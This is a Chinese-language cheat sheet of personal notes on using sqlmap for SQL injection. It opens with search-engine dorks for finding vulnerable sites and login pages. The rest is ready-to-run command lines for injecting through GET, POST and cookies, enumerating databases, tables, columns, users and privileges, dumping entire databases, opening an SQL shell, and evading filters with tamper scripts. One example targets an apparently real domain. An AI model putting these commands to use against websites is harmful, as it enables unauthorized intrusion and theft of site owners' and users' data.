# sqlmap笔记

<!-- TOC -->

- [sqlmap笔记](#sqlmap笔记)
    - [查找网站](#查找网站)
    - [sqlmap官网](#sqlmap官网)
    - [sqlmap简介：](#sqlmap简介)
    - [sqlmap支持五种不同的注入模式：](#sqlmap支持五种不同的注入模式)
    - [sqlmap支持的数据库有:](#sqlmap支持的数据库有)
    - [三种请求类型的注入测试](#三种请求类型的注入测试)
    - [MYSQL注入步骤：](#mysql注入步骤)
    - [补充：：](#补充)
    - [连接数据库：要先安装 PyMySQL/PyMySQL 不过我没成功](#连接数据库要先安装-pymysqlpymysql-不过我没成功)
    - [延时注入：](#延时注入)
    - [Tamper脚本注入：](#tamper脚本注入)
    - [默认使用level1检测全部数据库类型](#默认使用level1检测全部数据库类型)

<!-- /TOC -->

## 查找网站
>inurl：.php?id=
intitle: 登录
## sqlmap官网
>[sqlmap官网](http://sqlmap.org/)
## sqlmap简介：

>还有nosqlmap用nosql用的

## sqlmap支持五种不同的注入模式：
```
    1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
    2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
    3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
    4、联合查询注入，可以使用union的情况下的注入。
    5、堆查询注入，可以同时执行多条语句的执行时的注入。
```
##     sqlmap支持的数据库有:
  >MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

## 三种请求类型的注入测试
```    
    GET方式：      sqlmap -u "http://www.xxx.cn/post.php?id=1"
    POST方式：     sqlmap -u "URL:" --data "POST数据"
    Cookie方式：   sqlmap -u "URL:" --cookie "Cookie数据"
```
## MYSQL注入步骤：
```
    1、查看是否有注入点： sqlmap -u "http://xxx.xxx?type=11"
    2、获取库：          sqlmap -u "http://xxx.xxx?type=11" --current-db
    3、获取表：          sqlmap -u "http://xxx.xxx?type=11" --tables -D "库名"
    4、获取字段：        sqlmap -u "http://xxx.xxx?type=11" --columns -T "表名"  -D "库名"
    5、获取字段内容：    sqlmap -u "http://xxx.xxx?type=11" --dump -C "字段" -T "表名"  -D "库名"
```    
##     补充：：
```
    还有获取用户名：    sqlmap -u "http://xxx.xxx?type=11" --current-user
    还有获取所有用户名：    sqlmap -u "http://xxx.xxx?type=11" --users
    获取数据库数量：    sqlmap -u "http://xxx.xxx?type=11" --count -D "库名"
    判断用户权限：      sqlmap -u "http://xxx.xxx?type=11" --privileges
脱裤：          sqlmap -u "http://xxx.xxx?type=11"  --dump-all -D '库名'
```


## 连接数据库：要先安装 PyMySQL/PyMySQL 不过我没成功
>sqlmap -d "mysql://用户:密码@ip地址:3306/数据库" --sql-shell

## 延时注入：
1、自己写延时多长时间：sqlmap -u "http://xxx.xxx?type=11" --delay 10 
2、sqlmap -u "http://www.spwsbjgs.com/product.php?tid=87" -safe-freq 

## Tamper脚本注入：
sqlmap -u "URL" --tamper="脚本名"

## 默认使用level1检测全部数据库类型
sqlmap -u "http://www.vuln.cn/post.php?id=1"  --dbms mysql --level 3
指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

配合使用：--batch --tamper

指定数据库类型：  --dbms
MySQL
Oracle
PostgreSQL
Microsoft SQL Server


指定注入类型参数：--technique   这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。
支持的探测方式如下：
B: Boolean-based blind SQL injection（布尔型注入）
E: Error-based SQL injection（报错型注入）
U: UNION query SQL injection（可联合查询注入）
S: Stacked queries SQL injection（可多语句查询注入）
T: Time-based blind SQL injection（基于时间延迟注入）


指定操作系统:  --os
Linux
Windows
